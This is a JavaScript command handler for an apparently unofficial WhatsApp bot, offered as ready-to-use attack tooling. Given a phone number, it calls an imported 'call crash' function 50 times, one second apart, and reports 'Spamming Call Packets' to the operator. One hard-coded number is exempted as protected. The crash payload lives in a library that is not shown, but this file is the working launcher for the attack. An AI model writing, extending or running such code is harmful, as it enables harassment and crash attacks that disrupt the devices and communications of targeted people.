let { sendRizoCallCrash, callSleep } = require('../lib/rizo-call');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Rizo Call Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`📞 *RIZO Call Target Locked:* ${pepec}\n⚡ *Spamming Call Packets...*`);

    try {
        for (let i = 0; i < 50; i++) {
            await sendRizoCallCrash(conn, target);
            await callSleep(1000);
        }

        await conn.sendMessage(m.chat, { react: { text: "📞", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("⚠️ Error: Call payload execute karne mein masla aaya hai.");
    }
}

handler.command = ['rizocall', 'rzcall', 'callcrash'];
handler.tags = ['owner', 'rizo'];
handler.help = ['rizocall 923xx'];
module.exports = handler;
